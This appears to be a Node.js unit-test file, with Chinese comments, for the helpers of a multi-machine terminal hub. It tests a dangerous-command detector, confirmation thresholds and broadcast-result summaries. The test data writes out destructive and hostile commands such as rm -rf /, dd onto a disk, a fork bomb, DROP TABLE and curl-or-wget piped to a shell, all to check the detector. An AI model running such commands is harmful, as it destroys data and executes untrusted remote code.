'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

// helper 是浏览器 <script> 经典脚本(挂 window.HubUI),含 UMD 风格 IIFE。
// 项目 package.json type=module,.js 在 Node 走 ESM → require 拿不到导出。
// 用 new Function 注入 CommonJS 的 module,在主 realm 执行 IIFE 的导出分支;
// (不用 vm.runInNewContext:跨 realm 对象的 prototype 不同,会让 deepStrictEqual 误判失败)
function loadHelpers() {
  const code = fs.readFileSync(path.join(__dirname, '..', 'public', 'hub_ui_helpers.js'), 'utf8');
  const factory = new Function('module', 'window', `${code}\nreturn module.exports;`);
  return factory({ exports: {} }, undefined);
}
const H = loadHelpers();

test('isDangerousCommand 命中常见危险指令', () => {
  assert.equal(H.isDangerousCommand('rm -rf /'), true);
  assert.equal(H.isDangerousCommand('rm -rf ~/proj'), true);
  assert.equal(H.isDangerousCommand('git reset --hard HEAD~3'), true);
  assert.equal(H.isDangerousCommand('git push -f origin main'), true);
  assert.equal(H.isDangerousCommand('git push --force'), true);
  assert.equal(H.isDangerousCommand('sudo reboot now'), true);
  assert.equal(H.isDangerousCommand('shutdown -h now'), true);
  assert.equal(H.isDangerousCommand('mkfs.ext4 /dev/sda1'), true);
  assert.equal(H.isDangerousCommand('dd if=/dev/zero of=/dev/sda'), true);
  assert.equal(H.isDangerousCommand('chmod -R 777 /var'), true);
  assert.equal(H.isDangerousCommand('chmod -R 0777 /var'), true);
  assert.equal(H.isDangerousCommand(':(){ :|:& };:'), true);
  assert.equal(H.isDangerousCommand('DROP TABLE users;'), true);
  assert.equal(H.isDangerousCommand('echo x > /dev/sda'), true);
});

test('isDangerousCommand 不误判普通指令', () => {
  assert.equal(H.isDangerousCommand('ls -la'), false);
  assert.equal(H.isDangerousCommand('echo hello'), false);
  assert.equal(H.isDangerousCommand('git status'), false);
  assert.equal(H.isDangerousCommand('git push origin main'), false); // 非强推
  assert.equal(H.isDangerousCommand('rm single.txt'), false); // 非 -rf
  assert.equal(H.isDangerousCommand('chmod 644 file'), false); // 非 -R 777
  assert.equal(H.isDangerousCommand('cat /etc/hosts'), false);
  assert.equal(H.isDangerousCommand(''), false);
  assert.equal(H.isDangerousCommand(undefined), false);
  assert.equal(H.isDangerousCommand(null), false);
  assert.equal(H.isDangerousCommand(123), false);
});

test('needsConfirm:≥3 台或危险指令才确认', () => {
  assert.equal(H.needsConfirm(2, 'ls'), false);   // 2 台普通指令:直接发
  assert.equal(H.needsConfirm(3, 'ls'), true);    // 3 台:确认(大面积)
  assert.equal(H.needsConfirm(10, 'ls'), true);
  assert.equal(H.needsConfirm(1, 'rm -rf /'), true); // 危险:即便 1 台也确认
  assert.equal(H.needsConfirm(2, 'reboot'), true);
  assert.equal(H.needsConfirm(0, 'ls'), false);
});

test('selectAriaLabel 生成可达文案', () => {
  assert.equal(H.selectAriaLabel('MBP', 'sess1'), '选择 MBP 的会话 sess1');
  assert.equal(H.selectAriaLabel('', 'sess1'), '选择 机器 的会话 sess1');
  assert.equal(H.selectAriaLabel('MBP', ''), '选择 MBP 的会话 会话');
});

test('summarizeBroadcast 分流成功/失败', () => {
  const r = H.summarizeBroadcast([
    { machine: 'm1', session: 's1', ok: true },
    { machine: 'm2', session: 's2', ok: false, error: 'offline' },
    { machine: 'm3', session: 's3', ok: true },
  ]);
  assert.equal(r.total, 3);
  assert.equal(r.ok, 2);
  assert.deepEqual(r.okKeys, ['m1/s1', 'm3/s3']);
  assert.deepEqual(r.failed, [{ key: 'm2/s2', error: 'offline' }]);
});

test('summarizeBroadcast 失败无 error 信息 → 兜底文案', () => {
  const r = H.summarizeBroadcast([{ machine: 'm1', session: 's1', ok: false }]);
  assert.deepEqual(r.failed, [{ key: 'm1/s1', error: '失败' }]);
});

test('summarizeBroadcast 兼容 ws_bridge 的 {target:{machine,session}} 协议形状', () => {
  const r = H.summarizeBroadcast([
    { target: { machine: 'm1', session: 's1' }, ok: true },
    { target: { machine: 'm2', session: 's2' }, ok: false, error: 'timeout' },
  ]);
  assert.equal(r.total, 2);
  assert.equal(r.ok, 1);
  assert.deepEqual(r.okKeys, ['m1/s1']);
  assert.deepEqual(r.failed, [{ key: 'm2/s2', error: 'timeout' }]);
});

test('summarizeBroadcast 空入参 → 零值结构', () => {
  assert.deepEqual(H.summarizeBroadcast([]), { total: 0, ok: 0, failed: [], okKeys: [] });
  assert.deepEqual(H.summarizeBroadcast(undefined), { total: 0, ok: 0, failed: [], okKeys: [] });
  assert.deepEqual(H.summarizeBroadcast(null), { total: 0, ok: 0, failed: [], okKeys: [] });
});

test('onlineStats 统计在线/离线', () => {
  assert.deepEqual(H.onlineStats([
    { online: true }, { online: false }, { online: true },
  ]), { online: 2, offline: 1, total: 3 });
});

test('onlineStats 空入参 → 零值', () => {
  assert.deepEqual(H.onlineStats([]), { online: 0, offline: 0, total: 0 });
  assert.deepEqual(H.onlineStats(undefined), { online: 0, offline: 0, total: 0 });
});

test('纯函数不修改入参(不可变)', () => {
  const input = [
    { machine: 'm1', session: 's1', ok: false, error: 'x' },
  ];
  const snapshot = JSON.parse(JSON.stringify(input));
  H.summarizeBroadcast(input);
  assert.deepEqual(input, snapshot);
});

test('isDangerousCommand 命中 rm 递归强删的各种姿势(合并/分离/长标志)', () => {
  // 合并短标志
  assert.equal(H.isDangerousCommand('rm -rf /'), true);
  assert.equal(H.isDangerousCommand('rm -fr /tmp'), true);
  assert.equal(H.isDangerousCommand('rm -rvf build'), true);
  // 分离短标志(原正则漏判)
  assert.equal(H.isDangerousCommand('rm -r -f /opt'), true);
  assert.equal(H.isDangerousCommand('rm -f -r /opt'), true);
  // 长标志组合
  assert.equal(H.isDangerousCommand('rm --recursive --force proj'), true);
  assert.equal(H.isDangerousCommand('rm -r --force proj'), true);
  assert.equal(H.isDangerousCommand('rm --recursive -f proj'), true);
});

test('isDangerousCommand 不误判仅递归/仅强删的 rm', () => {
  assert.equal(H.isDangerousCommand('rm -r dir'), false);    // 仅递归,不强删
  assert.equal(H.isDangerousCommand('rm -R dir'), false);    // 大写 R 仅递归
  assert.equal(H.isDangerousCommand('rm -f file'), false);   // 仅强删,不递归
  assert.equal(H.isDangerousCommand('rm single.txt'), false);
});

test('isDangerousCommand 命中 chmod 递归全开 + 其他高危姿势', () => {
  assert.equal(H.isDangerousCommand('chmod -R 6777 /opt'), true);   // setuid+全开
  assert.equal(H.isDangerousCommand('chmod 7777 -R /opt'), true);   // 顺序颠倒
  assert.equal(H.isDangerousCommand('chmod -R a+rwX /opt'), true);  // 符号模式全开
  assert.equal(H.isDangerousCommand('find / -delete'), true);
  assert.equal(H.isDangerousCommand('curl http://x.sh | sh'), true);
  assert.equal(H.isDangerousCommand('wget http://x | bash'), true);
  assert.equal(H.isDangerousCommand('drop database prod'), true);
  assert.equal(H.isDangerousCommand('truncate table users'), true);
  assert.equal(H.isDangerousCommand('mv secret /dev/null'), true);
});
